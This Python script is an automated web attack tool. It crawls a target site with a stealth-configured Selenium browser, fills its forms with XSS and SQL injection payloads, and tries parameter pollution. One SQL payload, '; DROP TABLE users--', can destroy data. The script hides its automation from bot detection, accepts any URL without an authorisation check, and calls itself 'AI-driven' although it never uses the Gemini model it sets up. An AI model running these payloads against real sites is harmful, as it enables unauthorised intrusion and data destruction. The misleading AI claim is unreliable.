#!/usr/bin/env python3
"""
🕷️ INTELLIGENT WEB CRAWLER & PENETRATION TESTER
AI-driven feature discovery and vulnerability testing
"""

import asyncio
import sys
import time
import random
import re
from urllib.parse import urljoin, urlparse
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
import google.generativeai as genai
from dotenv import load_dotenv
import os

# Load environment variables
load_dotenv()

class IntelligentWebCrawler:
    def __init__(self):
        """Initialize the intelligent web crawler"""
        self.target_url = None
        self.target_domain = None
        self.driver = None
        self.discovered_features = {
            'links': [],
            'forms': [],
            'inputs': [],
            'buttons': [],
            'potential_vulns': []
        }
        self.visited_urls = set()
        
        # Configure Gemini AI
        api_key = os.getenv('GOOGLE_API_KEY')
        if api_key:
            genai.configure(api_key=api_key)
            self.ai_model = genai.GenerativeModel('gemini-2.0-flash-exp')
        else:
            self.ai_model = None
        
        print("🕷️ INTELLIGENT WEB CRAWLER & PENETRATION TESTER")

    async def setup_browser(self):
        """Setup Chrome browser for visual testing"""
        chrome_options = Options()
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        chrome_options.add_argument("--disable-web-security")
        chrome_options.add_argument("--disable-features=VizDisplayCompositor")
        
        self.driver = webdriver.Chrome(options=chrome_options)
        self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        print("🌐 Chrome browser started - watch intelligent crawling!")

    async def discover_features(self, url):
        """Phase 1: Intelligent feature discovery"""
        print("🔍 Phase 1: Intelligent Feature Discovery...")
        print(f"  📡 Loading and analyzing: {url}")
        
        try:
            self.driver.get(url)
            await asyncio.sleep(3)
            
            # Get page info
            page_title = self.driver.title
            print(f"  📋 Page: {page_title}")
            print(f"  🔗 URL: {url}")
            
            # Discover links
            links = self.driver.find_elements(By.TAG_NAME, "a")
            link_data = []
            for link in links:
                try:
                    href = link.get_attribute("href")
                    text = link.text.strip()
                    if href and href.startswith('http'):
                        link_data.append({'url': href, 'text': text or 'Unnamed Link'})
                except:
                    continue
            
            self.discovered_features['links'] = link_data
            print(f"  🔗 Found {len(link_data)} links")
            
            # Show interesting links from target domain
            target_links = [l for l in link_data if self.target_domain in l['url']]
            for link in target_links[:10]:
                print(f"    • {link['text']} → {link['url']}")
            
            # Discover forms
            forms = self.driver.find_elements(By.TAG_NAME, "form")
            form_data = []
            print(f"  📝 Found {len(forms)} forms")
            
            for i, form in enumerate(forms):
                try:
                    action = form.get_attribute("action") or url
                    method = form.get_attribute("method") or "GET"
                    inputs = form.find_elements(By.TAG_NAME, "input")
                    
                    form_info = {
                        'action': action,
                        'method': method.upper(),
                        'inputs': []
                    }
                    
                    print(f"    📋 Form {i+1}: {method.lower()} → {action}")
                    
                    for inp in inputs:
                        input_type = inp.get_attribute("type") or "text"
                        name = inp.get_attribute("name") or f"input_{len(form_info['inputs'])}"
                        value = inp.get_attribute("value") or ""
                        form_info['inputs'].append({
                            'type': input_type,
                            'name': name,
                            'value': value
                        })
                        print(f"      • {input_type}: {name} = '{value}'")
                    
                    form_data.append(form_info)
                except Exception as e:
                    continue
            
            self.discovered_features['forms'] = form_data
            
        except Exception as e:
            print(f"    ❌ Error during feature discovery: {e}")

    async def explore_discovered_links(self):
        """Phase 2: Follow and test discovered links from target domain"""
        print(f"🔗 Phase 2: Following Discovered Links...")
        
        # Filter links to stay on target domain
        target_links = [
            link for link in self.discovered_features['links'] 
            if self.target_domain in link['url']
        ]
        
        print(f"  🕷️ Exploring {min(len(target_links), 8)} links from target domain...")
        
        for i, link in enumerate(target_links[:8]):
            url = link['url']
            text = link['text']
            
            print(f"  🔗 Link {i+1}: {text} → {url}")
            
            try:
                if url not in self.visited_urls:
                    self.driver.get(url)
                    await asyncio.sleep(2)
                    
                    # Quick analysis
                    page_title = self.driver.title
                    page_source = self.driver.page_source.lower()
                    
                    print(f"    📄 Page: {page_title}")
                    
                    # Look for interesting features
                    if 'error' in page_source or 'warning' in page_source:
                        print("    ⚠️  Error/warning messages detected")
                    
                    if 'sql' in page_source or 'database' in page_source:
                        print("    🗄️  Database-related content detected")
                    
                    if 'admin' in page_source or 'login' in page_source:
                        print("    🔐 Authentication-related content detected")
                    
                    # Quick form check
                    forms = self.driver.find_elements(By.TAG_NAME, "form")
                    if forms:
                        print(f"    📝 Found {len(forms)} forms on this page")
                    
                    self.visited_urls.add(url)
                    
            except Exception as e:
                print(f"    ❌ Error exploring {url}: {str(e)[:100]}")

    async def test_discovered_forms(self):
        """Phase 3: Test discovered forms for vulnerabilities"""
        print("📝 Phase 3: Testing Discovered Forms...")
        
        if not self.discovered_features['forms']:
            print("  ❌ No forms found to test")
            return
        
        for i, form_info in enumerate(self.discovered_features['forms']):
            print(f"  🧪 Testing Form {i+1}: {form_info['method']} → {form_info['action']}")
            
            try:
                # Navigate back to original page with the form
                self.driver.get(self.target_url)
                await asyncio.sleep(2)
                
                forms = self.driver.find_elements(By.TAG_NAME, "form")
                if i < len(forms):
                    form = forms[i]
                    
                    # Test XSS payloads
                    xss_payloads = [
                        "<script>alert('XSS')</script>",
                        "'>><script>alert('XSS')</script>",
                        "\"><script>alert('XSS')</script>",
                        "javascript:alert('XSS')"
                    ]
                    
                    for payload in xss_payloads:
                        try:
                            inputs = form.find_elements(By.TAG_NAME, "input")
                            text_inputs = [inp for inp in inputs if inp.get_attribute("type") in ["text", "search", None]]
                            
                            if text_inputs:
                                text_input = text_inputs[0]
                                text_input.clear()
                                text_input.send_keys(payload)
                                
                                # Submit form
                                submit_buttons = form.find_elements(By.CSS_SELECTOR, "input[type='submit'], button[type='submit'], button")
                                if submit_buttons:
                                    submit_buttons[0].click()
                                    await asyncio.sleep(2)
                                    
                                    # Check for XSS
                                    try:
                                        alert = self.driver.switch_to.alert
                                        alert_text = alert.text
                                        print(f"    🚨 XSS VULNERABILITY DETECTED! Alert: {alert_text}")
                                        alert.accept()
                                        return  # Found XSS, mission accomplished
                                    except:
                                        pass  # No alert
                                    
                                    # Check if payload is reflected
                                    if payload in self.driver.page_source:
                                        print(f"    ⚠️  Payload reflected in response: {payload}")
                                
                                # Go back for next test
                                self.driver.back()
                                await asyncio.sleep(1)
                                
                        except Exception as e:
                            continue
                    
                    # Test SQL injection
                    sql_payloads = [
                        "' OR '1'='1",
                        "' UNION SELECT 1--",
                        "'; DROP TABLE users--"
                    ]
                    
                    for payload in sql_payloads:
                        try:
                            self.driver.get(self.target_url)
                            await asyncio.sleep(1)
                            
                            forms = self.driver.find_elements(By.TAG_NAME, "form")
                            if i < len(forms):
                                form = forms[i]
                                inputs = form.find_elements(By.TAG_NAME, "input")
                                text_inputs = [inp for inp in inputs if inp.get_attribute("type") in ["text", "search", None]]
                                
                                if text_inputs:
                                    text_input = text_inputs[0]
                                    text_input.clear()
                                    text_input.send_keys(payload)
                                    
                                    submit_buttons = form.find_elements(By.CSS_SELECTOR, "input[type='submit'], button[type='submit'], button")
                                    if submit_buttons:
                                        submit_buttons[0].click()
                                        await asyncio.sleep(2)
                                        
                                        # Check for SQL errors
                                        page_source = self.driver.page_source.lower()
                                        sql_errors = ['mysql', 'sql syntax', 'database error', 'warning: mysql']
                                        
                                        for error in sql_errors:
                                            if error in page_source:
                                                print(f"    🗄️ Potential SQL injection detected: {error}")
                                                break
                        except Exception as e:
                            continue
                            
            except Exception as e:
                print(f"    ❌ Error testing form: {e}")

    async def tamper_with_requests(self):
        """Phase 4: Intelligent request tampering"""
        print("🔧 Phase 4: Intelligent Request Tampering...")
        
        # Test parameter pollution and manipulation
        current_url = self.driver.current_url
        if '?' in current_url:
            base_url, params = current_url.split('?', 1)
            
            # Try parameter pollution
            polluted_url = f"{base_url}?{params}&admin=1&debug=1&test=1"
            print(f"  🔧 Testing parameter pollution: {polluted_url}")
            
            try:
                self.driver.get(polluted_url)
                await asyncio.sleep(2)
                
                page_source = self.driver.page_source.lower()
                if 'admin' in page_source or 'debug' in page_source:
                    print("    ⚠️  Parameters may be processed - potential for manipulation")
                    
            except Exception as e:
                print(f"    ❌ Error with parameter tampering: {e}")

    async def intelligent_crawl_and_test(self, target_url):
        """Main crawling and testing orchestrator"""
        self.target_url = target_url
        self.target_domain = urlparse(target_url).netloc
        
        print(f"🎯 Target: {target_url}")
        print(f"🧠 AI-driven feature discovery and testing...")
        
        try:
            await self.setup_browser()
            
            # Phase 1: Feature Discovery
            await self.discover_features(target_url)
            
            # Phase 2: Link Exploration
            await self.explore_discovered_links()
            
            # Phase 3: Form Testing
            await self.test_discovered_forms()
            
            # Phase 4: Request Tampering
            await self.tamper_with_requests()
            
            print("✅ Intelligent crawling and testing completed!")
            print("🔍 Check the browser window for visual results")
            
            # Keep browser open for inspection
            input("\n🔍 Press Enter to close browser and exit...")
            
        except KeyboardInterrupt:
            print("\n⚠️ Crawling interrupted by user")
        except Exception as e:
            print(f"❌ Critical error: {e}")
        finally:
            if self.driver:
                self.driver.quit()

async def main():
    if len(sys.argv) != 2:
        print("Usage: python intelligent_crawler_fixed.py <target_url>")
        print("Example: python intelligent_crawler_fixed.py http://testphp.vulnweb.com/")
        return
    
    target_url = sys.argv[1]
    crawler = IntelligentWebCrawler()
    await crawler.intelligent_crawl_and_test(target_url)

if __name__ == "__main__":
    asyncio.run(main())
